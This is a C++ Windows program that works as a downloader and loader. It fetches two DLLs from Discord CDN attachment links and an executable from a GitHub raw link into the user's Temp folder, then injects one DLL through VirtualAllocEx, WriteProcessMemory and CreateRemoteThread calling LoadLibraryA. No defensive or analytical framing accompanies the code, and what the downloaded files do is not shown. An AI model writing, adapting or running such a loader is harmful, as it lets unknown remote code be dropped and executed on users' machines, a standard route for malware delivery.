#include <windows.h>
#include <urlmon.h>
#include <lmcons.h>
#include <string>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "user32.lib")
#pragma warning(suppress: 28251)

std::string GetUserTempPath() {
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserNameA(username, &username_len);
    return std::string("C:\\Users\\") + username + "\\AppData\\Local\\Temp\\";
}

bool FileExists(const char* filePath) {
    DWORD attrib = GetFileAttributesA(filePath);
    return (attrib != INVALID_FILE_ATTRIBUTES && !(attrib & FILE_ATTRIBUTE_DIRECTORY));
}

bool DownloadFile(const char* url, const char* destination) {
    HRESULT hr = URLDownloadToFileA(NULL, url, destination, 0, NULL);
    if (hr != S_OK) {
        char errorMsg[256];
        sprintf_s(errorMsg, "Failed to download %s (HRESULT: 0x%X)", url, hr);
        MessageBoxA(NULL, errorMsg, "Download Error", MB_OK | MB_ICONERROR);
        return false;
    }
    return true;
}

bool InjectDLL(DWORD processID, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (!hProcess) {
        MessageBoxA(NULL, "Failed to open process", "Injection Error", MB_OK | MB_ICONERROR);
        return false;
    }

    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (!remoteMemory) {
        CloseHandle(hProcess);
        MessageBoxA(NULL, "Failed to allocate remote memory", "Injection Error", MB_OK | MB_ICONERROR);
        return false;
    }

    if (!WriteProcessMemory(hProcess, remoteMemory, dllPath, strlen(dllPath) + 1, NULL)) {
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        MessageBoxA(NULL, "Failed to write process memory", "Injection Error", MB_OK | MB_ICONERROR);
        return false;
    }

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        MessageBoxA(NULL, "Failed to get kernel32.dll handle", "Injection Error", MB_OK | MB_ICONERROR);
        return false;
    }

    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");
    if (!loadLibraryAddr) {
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        MessageBoxA(NULL, "Failed to get LoadLibraryA address", "Injection Error", MB_OK | MB_ICONERROR);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)loadLibraryAddr, remoteMemory, 0, NULL);

    if (!hThread) {
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        MessageBoxA(NULL, "Failed to create remote thread", "Injection Error", MB_OK | MB_ICONERROR);
        return false;
    }

    WaitForSingleObject(hThread, INFINITE);

    VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return true;
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    std::string tempPath = GetUserTempPath();

    std::string polyHookPath = tempPath + "PolyHook_2.dll";
    std::string qdPath = tempPath + "qd.dll";
    std::string exePath = tempPath + "example.exe";

    const char* polyHookUrl = "https://cdn.discordapp.com/attachments/1340029464901451776/1357077590342373566/PolyHook_2.dll?ex=67eee47e&is=67ed92fe&hm=8de0f168b99f6fd570feffce7610d66b9c3632962dc98f22c7315e00d0895df5&";
    const char* qdUrl = "https://cdn.discordapp.com/attachments/1340029464901451776/1357077590028058734/qd_1.dll?ex=67eee47e&is=67ed92fe&hm=0642dd2c8582f8781e349353434195aaa1aef03cbe2b600ff5f4b0e4e951051c&"; // Replace with your actual URL
    const char* exeUrl = "https://github.com/bollocks-creator/fluffy-computing-machine/raw/refs/heads/main/example.exe"; // Replace with your actual URL

    if (!FileExists(polyHookPath.c_str())) {
        if (!DownloadFile(polyHookUrl, polyHookPath.c_str())) {
            return 1;
        }
    }

    if (!DownloadFile(qdUrl, qdPath.c_str())) {
        return 1;
    }

    if (!DownloadFile(exeUrl, exePath.c_str())) {
        return 1;
    }

    DWORD processID = GetCurrentProcessId();

    if (!InjectDLL(processID, qdPath.c_str())) {
        return 1;
    }

    return 0;
}